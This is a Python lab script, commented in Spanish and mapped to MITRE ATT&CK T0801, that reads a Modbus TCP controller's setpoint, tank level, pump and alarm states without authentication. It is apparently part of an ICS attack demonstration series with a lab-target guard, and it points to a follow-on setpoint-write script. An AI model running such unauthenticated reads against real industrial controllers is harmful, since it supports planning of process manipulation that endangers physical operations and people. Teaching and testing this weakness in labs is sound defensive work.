"""
02_unauthorized_read.py - Lectura NO autorizada del proceso (setpoint y nivel).

MITRE ATT&CK for ICS: T0801 - Monitor Process State (tactica Collection, TA0100)
https://attack.mitre.org/techniques/T0801/

Cualquier cliente Modbus TCP puede leer el estado del proceso (nivel actual,
setpoint, estado de la bomba y de la alarma) sin ninguna autorizacion. Un
atacante usaria esta informacion para decidir como manipular el proceso con
el minimo esfuerzo (por ejemplo, sabiendo el setpoint actual, a que valor
escribir para provocar el efecto deseado).

Uso: python 02_unauthorized_read.py [--host 192.168.20.10] [--port 502]
"""
import argparse

from pymodbus.client import ModbusTcpClient

from _lab_guard import ensure_lab_target

REG_SETPOINT = 0
REG_NIVEL = 1
COIL_BOMBA = 0
COIL_ALARMA = 1


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--host", default="192.168.20.10")
    parser.add_argument("--port", type=int, default=502)
    parser.add_argument("--unit-id", type=int, default=1)
    args = parser.parse_args()

    ensure_lab_target(args.host)

    client = ModbusTcpClient(args.host, port=args.port)
    if not client.connect():
        print(f"[!] No se pudo conectar a {args.host}:{args.port}")
        return

    setpoint = client.read_holding_registers(address=REG_SETPOINT, count=1, slave=args.unit_id)
    nivel = client.read_holding_registers(address=REG_NIVEL, count=1, slave=args.unit_id)
    coils = client.read_coils(address=COIL_BOMBA, count=2, slave=args.unit_id)
    client.close()

    if setpoint.isError() or nivel.isError() or coils.isError():
        print("[!] Error de lectura Modbus.")
        return

    print("[*] Lectura no autorizada completada sin ninguna credencial:")
    print(f"    setpoint actual : {setpoint.registers[0] / 10:.1f} %")
    print(f"    nivel actual    : {nivel.registers[0] / 10:.1f} %")
    print(f"    bomba encendida : {coils.bits[0]}")
    print(f"    alarma activa   : {coils.bits[1]}")
    print(
        "\n[*] Con este estado del proceso, un atacante ya sabe que "
        "valor de setpoint (03_unauthorized_write_setpoint.py) provocaria "
        "el efecto que busca."
    )


if __name__ == "__main__":
    main()
